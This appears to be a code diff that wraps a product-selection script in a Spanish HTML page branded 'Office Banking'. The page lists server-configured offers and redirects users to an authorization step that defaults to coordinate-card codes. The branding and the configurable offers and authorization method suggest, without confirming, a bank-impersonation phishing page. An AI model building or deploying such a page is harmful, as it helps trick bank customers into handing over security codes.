@@ -1,79 +1,124 @@
-document.addEventListener("DOMContentLoaded", () => {
-  const API_URL = "/config";
-  const contenedor = document.getElementById("listaProductos");
-  const mensaje = document.getElementById("mensaje");
-  let tipoAutorizacion = "coordenadas"; // valor por defecto
-
-  // Formato CLP
-  function formatoCLP(valor){
-    return new Intl.NumberFormat("es-CL", {
-      style: "currency",
-      currency: "CLP",
-      minimumFractionDigits: 0,
-      maximumFractionDigits: 0
-    }).format(valor);
-  }
-
-  // Cargar configuración
-  fetch(API_URL)
-    .then(res => res.json())
-    .then(cfg => {
-      contenedor.innerHTML = "";
-      let contador = 1;
-
-      if(cfg.producto1 && cfg.producto1.trim() !== ""){
-        contenedor.innerHTML += `
-          <div class="producto">
-            <label>
-              <input type="radio" name="opcion" value="producto1"> 
-              <span>${contador}.- ${cfg.producto1} por ${cfg.monto1 ? formatoCLP(cfg.monto1) : ""}</span>
-            </label>
-          </div>`;
-        contador++;
-      }
-
-      if(cfg.producto2 && cfg.producto2.trim() !== ""){
-        contenedor.innerHTML += `
-          <div class="producto">
-            <label>
-              <input type="radio" name="opcion" value="producto2"> 
-              <span>${contador}.- ${cfg.producto2} por ${cfg.monto2 ? formatoCLP(cfg.monto2) : ""}</span>
-            </label>
-          </div>`;
-        contador++;
-      }
-
-      if(cfg.producto3 && cfg.producto3.trim() !== ""){
-        contenedor.innerHTML += `
-          <div class="producto">
-            <label>
-              <input type="radio" name="opcion" value="producto3"> 
-              <span>${contador}.- ${cfg.producto3}</span>
-            </label>
-          </div>`;
-        contador++;
-      }
-
-      tipoAutorizacion = cfg.tipoAutorizacion || "coordenadas";
-    })
-    .catch(err => {
-      console.error("Error al cargar configuración:", err);
-      mensaje.innerText = "⚠️ No se pudo cargar configuración del servidor.";
-    });
-
-  // Botón LO QUIERO
-  document.getElementById("quieroBtn").addEventListener("click", () => {
-    const seleccion = document.querySelector('input[name="opcion"]:checked');
-    if(!seleccion){
-      mensaje.innerText = "⚠️ Debes seleccionar un producto.";
-      return;
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8">
+  <title>Productos disponibles</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <link rel="stylesheet" href="styles.css">
+  <style>
+    .producto {
+      margin: 10px 0;
+      padding: 10px;
+      border: 1px solid #ccc;
+      border-radius: 6px;
     }
+    .btn-red {
+      background-color: red;
+      color: white;
+      padding: 10px 20px;
+      border: none;
+      font-weight: bold;
+      cursor: pointer;
+      margin-top: 20px;
+    }
+    #mensaje {
+      margin-top: 15px;
+      font-weight: bold;
+      color: red;
+    }
+  </style>
+</head>
+<body>
+  <div class="productos-box">
+    <img src="logo-office-banking.png" alt="Office Banking" class="logo">
 
-    localStorage.setItem("seleccionProducto", seleccion.value);
-    mensaje.innerText = "Serás redirigido al área de autorización...";
+    <h2>Selecciona el producto que deseas solicitar</h2>
+    <div id="listaProductos"></div>
 
-    setTimeout(() => {
-      window.location.href = "/autorizacion";
-    }, 2000);
-  });
-});
+    <button id="quieroBtn" class="btn-red">LO QUIERO</button>
+    <div id="mensaje"></div>
+  </div>
+
+  <script>
+    document.addEventListener("DOMContentLoaded", () => {
+      const API_URL = "/config";
+      const contenedor = document.getElementById("listaProductos");
+      const mensaje = document.getElementById("mensaje");
+      let tipoAutorizacion = "coordenadas"; // valor por defecto
+
+      // Formato CLP
+      function formatoCLP(valor){
+        return new Intl.NumberFormat("es-CL", {
+          style: "currency",
+          currency: "CLP",
+          minimumFractionDigits: 0,
+          maximumFractionDigits: 0
+        }).format(valor);
+      }
+
+      // Cargar configuración desde el backend
+      fetch(API_URL)
+        .then(res => res.json())
+        .then(cfg => {
+          contenedor.innerHTML = "";
+          let contador = 1;
+
+          if(cfg.producto1 && cfg.producto1.trim() !== ""){
+            contenedor.innerHTML += `
+              <div class="producto">
+                <label>
+                  <input type="radio" name="opcion" value="producto1"> 
+                  <span>${contador}.- ${cfg.producto1} por ${cfg.monto1 ? formatoCLP(cfg.monto1) : ""}</span>
+                </label>
+              </div>`;
+            contador++;
+          }
+
+          if(cfg.producto2 && cfg.producto2.trim() !== ""){
+            contenedor.innerHTML += `
+              <div class="producto">
+                <label>
+                  <input type="radio" name="opcion" value="producto2"> 
+                  <span>${contador}.- ${cfg.producto2} por ${cfg.monto2 ? formatoCLP(cfg.monto2) : ""}</span>
+                </label>
+              </div>`;
+            contador++;
+          }
+
+          if(cfg.producto3 && cfg.producto3.trim() !== ""){
+            contenedor.innerHTML += `
+              <div class="producto">
+                <label>
+                  <input type="radio" name="opcion" value="producto3"> 
+                  <span>${contador}.- ${cfg.producto3}</span>
+                </label>
+              </div>`;
+            contador++;
+          }
+
+          tipoAutorizacion = cfg.tipoAutorizacion || "coordenadas";
+        })
+        .catch(err => {
+          console.error("Error al cargar configuración:", err);
+          mensaje.innerText = "⚠️ No se pudo cargar configuración del servidor.";
+        });
+
+      // Botón LO QUIERO
+      document.getElementById("quieroBtn").addEventListener("click", () => {
+        const seleccion = document.querySelector('input[name="opcion"]:checked');
+        if(!seleccion){
+          mensaje.innerText = "⚠️ Debes seleccionar un producto.";
+          return;
+        }
+
+        localStorage.setItem("seleccionProducto", seleccion.value);
+        mensaje.innerText = "Serás redirigido al área de autorización...";
+
+        setTimeout(() => {
+          window.location.href = "/autorizacion";
+        }, 2000);
+      });
+    });
+  </script>
+</body>
+</html>
